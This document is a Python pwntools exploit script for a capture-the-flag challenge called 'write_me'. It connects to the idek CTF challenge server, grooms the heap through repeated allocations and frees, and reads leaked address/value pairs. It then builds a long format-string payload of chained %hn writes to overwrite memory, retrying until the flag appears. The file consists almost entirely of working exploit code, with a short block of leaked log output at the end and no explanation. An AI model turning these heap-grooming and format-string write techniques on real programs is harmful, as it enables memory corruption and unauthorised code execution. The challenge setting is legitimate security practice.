#!/usr/bin/python3

from pwn import *

exe = ELF('write_me_patched', checksec=False)
libc = ELF('libc.so.6', checksec=False)
context.binary = exe


def info(msg): return log.info(msg)
def sla(msg, data): return p.sendlineafter(msg, data)
def sa(msg, data): return p.sendafter(msg, data)
def sl(data): return p.sendline(data)
def s(data): return p.send(data)
def sln(msg, num): return sla(msg, str(num).encode())
def sn(msg, num): return sa(msg, str(num).encode())


def GDB():
    if not args.REMOTE:
        gdb.attach(p, gdbscript='''
        brva 0x1716

        c
        ''')
        input()

while True:
    if args.REMOTE:
        p = remote('write-me.chal.idek.team', 1337)
    else:
        p = process(exe.path)
    # GDB()


    def challenge():
        sla(b'? ', b'3')


    def create(idx, sz):
        sla(b'Choice? ', b'1')
        sla(b'Index? ', str(idx))
        sla(b'Size? ', str(sz))
        return idx


    def delete(idx):
        sla(b'Choice? ', b'2')
        sla(b'Index? ', str(idx))


    create(99, 0x1000-0x10)
    create(100, 0x1000-0x10)
    create(101, 0x1000-0x10-0x2b0)

    create(0, 0x10)
    delete(0)

    chunk1 = []
    for i in range(2, 34):
        chunk1.append(create(i, 0x10*i))
    chunk2 = []
    for i in range(2, 34):
        chunk2.append(create(32+i, 0x10*i))
    chunk3 = []
    for i in range(2, 34):
        chunk3.append(create(64+i, 0x10*i))
    chunk4 = []
    for i in range(2, 34):
        chunk4.append(create(128+i, 0x10*i))
    chunk5 = []
    for i in range(2, 34):
        chunk5.append(create(160+i, 0x10*i))
    chunk6 = []
    for i in range(2, 34):
        chunk6.append(create(192+i, 0x10*i))


    for i in chunk6:
        delete(i)
    for i in chunk5:
        delete(i)
    for i in chunk4:
        delete(i)
    for i in chunk2:
        delete(i)
    for i in chunk3:
        delete(i)
    for i in chunk1:
        delete(i)

    print("malloc done")
    challenge()

    high = []
    med = []
    low = []
    l_addr = []
    h_addr = []
    idx = 1685
    for i in range(16):
        p.recvuntil(b'Write ')
        value = int(p.recvuntil(b' to address ', drop=True), 16)
        ptr = int(p.recvline(keepends=False), 16)
        low.append(ptr & 0xffff)
        med.append((ptr >> 16) & 0xffff)
        high.append((ptr >> 32) & 0xffff)
        l_addr.append(value & 0xffff)
        h_addr.append((value >> 16) & 0xffff)
        info(hex(ptr) + "|" + hex(value))

    pa = b""
    fmt = b"%hn"
    tmp = 0
    cntt = 0


    def exp(st, sc, pading):
        global pa, fmt, tmp, cntt
        pa += b"%c"*pading + f"%{sc-st - pading}c".encode() + fmt
        tmp = sc
        cntt += pading


    def loop(begin, n, cnt=4):
        global tmp
        val_heap = 0x40
        for i in range(n):
            exp(tmp, begin, cnt)
            cnt += 2
            begin += val_heap
            val_heap += 0x10


    exp(tmp, 0xb914, 3)
    loop(0xb944, 31)
    exp(tmp, 0x1b912, 66)
    loop(0x1b942, 31)

    for i in range(16):
        if i == 0:
            while high[i] < tmp:
                high[i] += 0x10000
        else:
            while high[i] < high[i-1]:
                high[i] += 0x10000
        # print(hex(high[i]))
    exp(tmp, high[0], 66)
    exp(tmp, high[1], 4)
    exp(tmp, high[2], 6)
    exp(tmp, high[3], 8)
    exp(tmp, high[4], 10)
    exp(tmp, high[5], 12)
    exp(tmp, high[6], 14)
    exp(tmp, high[7], 16)
    exp(tmp, high[8], 18)
    exp(tmp, high[9], 20)
    exp(tmp, high[10], 22)
    exp(tmp, high[11], 24)
    exp(tmp, high[12], 26)
    exp(tmp, high[13], 28)
    exp(tmp, high[14], 30)
    exp(tmp, high[15], 32)
    for i in range(16):
        if i == 0:
            while high[i] < tmp:
                high[i] += 0x10000
        else:
            while high[i] < high[i-1]:
                high[i] += 0x10000
    exp(tmp, high[0], 34)
    exp(tmp, high[1], 36)
    exp(tmp, high[2], 38)
    exp(tmp, high[3], 40)
    exp(tmp, high[4], 42)
    exp(tmp, high[5], 44)
    exp(tmp, high[6], 46)
    exp(tmp, high[7], 48)
    exp(tmp, high[8], 50)
    exp(tmp, high[9], 52)
    exp(tmp, high[10], 54)
    exp(tmp, high[11], 56)
    exp(tmp, high[12], 58)
    exp(tmp, high[13], 60)
    exp(tmp, high[14], 62)
    exp(tmp, high[15], 64)
    ####
    for i in range(16):
        if i == 0:
            while med[i] < tmp:
                med[i] += 0x10000
        else:
            while med[i] < med[i-1]:
                med[i] += 0x10000
    exp(tmp, med[0], 66)
    exp(tmp, med[1], 4)
    exp(tmp, med[2], 6)
    exp(tmp, med[3], 8)
    exp(tmp, med[4], 10)
    exp(tmp, med[5], 12)
    exp(tmp, med[6], 14)
    exp(tmp, med[7], 16)
    exp(tmp, med[8], 18)
    exp(tmp, med[9], 20)
    exp(tmp, med[10], 22)
    exp(tmp, med[11], 24)
    exp(tmp, med[12], 26)
    exp(tmp, med[13], 28)
    exp(tmp, med[14], 30)
    exp(tmp, med[15], 32)
    for i in range(16):
        if i == 0:
            while med[i] < tmp:
                med[i] += 0x10000
        else:
            while med[i] < med[i-1]:
                med[i] += 0x10000
    exp(tmp, med[0], 34)
    exp(tmp, med[1], 36)
    exp(tmp, med[2], 38)
    exp(tmp, med[3], 40)
    exp(tmp, med[4], 42)
    exp(tmp, med[5], 44)
    exp(tmp, med[6], 46)
    exp(tmp, med[7], 48)
    exp(tmp, med[8], 50)
    exp(tmp, med[9], 52)
    exp(tmp, med[10], 54)
    exp(tmp, med[11], 56)
    exp(tmp, med[12], 58)
    exp(tmp, med[13], 60)
    exp(tmp, med[14], 62)
    exp(tmp, med[15], 64)
    ####
    for i in range(16):
        if i == 0:
            while low[i] < tmp:
                low[i] += 0x10000
        else:
            while low[i] < low[i-1]+0x10:
                low[i] += 0x10000
    exp(tmp, low[0], 66)
    exp(tmp, low[1], 4)
    exp(tmp, low[2], 6)
    exp(tmp, low[3], 8)
    exp(tmp, low[4], 10)
    exp(tmp, low[5], 12)
    exp(tmp, low[6], 14)
    exp(tmp, low[7], 16)
    exp(tmp, low[8], 18)
    exp(tmp, low[9], 20)
    exp(tmp, low[10], 22)
    exp(tmp, low[11], 24)
    exp(tmp, low[12], 26)
    exp(tmp, low[13], 28)
    exp(tmp, low[14], 30)
    exp(tmp, low[15], 32)
    for i in range(16):
        if i == 0:
            while low[i] < tmp:
                low[i] += 0x10000
        else:
            while low[i] < low[i-1]+0x10:
                low[i] += 0x10000
    exp(tmp, low[0]+2, 34)
    exp(tmp, low[1]+2, 36)
    exp(tmp, low[2]+2, 38)
    exp(tmp, low[3]+2, 40)
    exp(tmp, low[4]+2, 42)
    exp(tmp, low[5]+2, 44)
    exp(tmp, low[6]+2, 46)
    exp(tmp, low[7]+2, 48)
    exp(tmp, low[8]+2, 50)
    exp(tmp, low[9]+2, 52)
    exp(tmp, low[10]+2, 54)
    exp(tmp, low[11]+2, 56)
    exp(tmp, low[12]+2, 58)
    exp(tmp, low[13]+2, 60)
    exp(tmp, low[14]+2, 62)
    exp(tmp, low[15]+2, 64)
    ###


    def exp1(st, sc, pading):
        global pa, fmt, tmp, cntt
        pa += f"%{sc-st}c".encode() + f"%{pading}$hn".encode()
        tmp = sc


    while l_addr[0] < tmp-0x100:
        l_addr[0] += 0x10000
    for i in range(1, 16):
        while l_addr[i] < l_addr[i-1]:
            l_addr[i] += 0x10000

    exp1(tmp, l_addr[0], 5925)
    exp1(tmp, l_addr[1], 5931)
    exp1(tmp, l_addr[2], 5939)
    exp1(tmp, l_addr[3], 5949)
    exp1(tmp, l_addr[4], 5961)
    exp1(tmp, l_addr[5], 5975)
    exp1(tmp, l_addr[6], 5991)
    exp1(tmp, l_addr[7], 6009)
    exp1(tmp, l_addr[8], 6029)
    exp1(tmp, l_addr[9], 6051)
    exp1(tmp, l_addr[10], 6075)
    exp1(tmp, l_addr[11], 6101)
    exp1(tmp, l_addr[12], 6129)
    exp1(tmp, l_addr[13], 6159)
    exp1(tmp, l_addr[14], 6191)
    exp1(tmp, l_addr[15], 6225)

    while h_addr[0] < tmp-0x100:
        h_addr[0] += 0x10000
    for i in range(1, 16):
        while h_addr[i] < h_addr[i-1]:
            h_addr[i] += 0x10000
    exp1(tmp, h_addr[0], 6261)
    exp1(tmp, h_addr[1], 6299)
    exp1(tmp, h_addr[2], 6339)
    exp1(tmp, h_addr[3], 6381)
    exp1(tmp, h_addr[4], 6425)
    exp1(tmp, h_addr[5], 6471)
    exp1(tmp, h_addr[6], 6519)
    exp1(tmp, h_addr[7], 6569)
    exp1(tmp, h_addr[8], 6621)
    exp1(tmp, h_addr[9], 6675)
    exp1(tmp, h_addr[10], 6731)
    exp1(tmp, h_addr[11], 6789)
    exp1(tmp, h_addr[12], 6849)
    exp1(tmp, h_addr[13], 6911)
    exp1(tmp, h_addr[14], 6975)
    exp1(tmp, h_addr[15], 7041)

    sla(b'string? ', pa)
    # try:
    #     p.recv()
    #     while True:
    #         (len(p.recv()))
    # except:
    #     pass
    try:
        p.recvuntil(b'idek')
        print("Flag")
        break
    except:
        pass
    print("Again")
    p.close()
p.interactive()
'''
[*] 0x771aa737000
[*] 0x5ecaec41
[*] 0x3e690dc4000
[*] 0xcf9f711c
[*] 0xe19b4a6b000
[*] 0x72e60f2d
[*] 0xd60ec5b9000
[*] 0x991f57d7
[*] 0xa7167458000
[*] 0x7345315b
[*] 0xbc979bae000
[*] 0x6e38aad1
[*] 0x349ac5ee000
[*] 0xf88d85f
[*] 0x6afdb60e000
[*] 0xeaac53ad
[*] 0xd320a79b000
[*] 0x404e7732
[*] 0x8ec865c0000
[*] 0x17f30c2b
[*] 0xc0fcf59c000
[*] 0x4dc0e6b1
[*] 0x6b4cc3c1000
[*] 0x52676b1
[*] 0x2fbbe207000
[*] 0xac3b903c
[*] 0x1ad3a521000
[*] 0x3f34397e
[*] 0x92bb10e5000
[*] 0xf4de09f1
[*] 0x2405dac1000
[*] 0xcf908059
'''
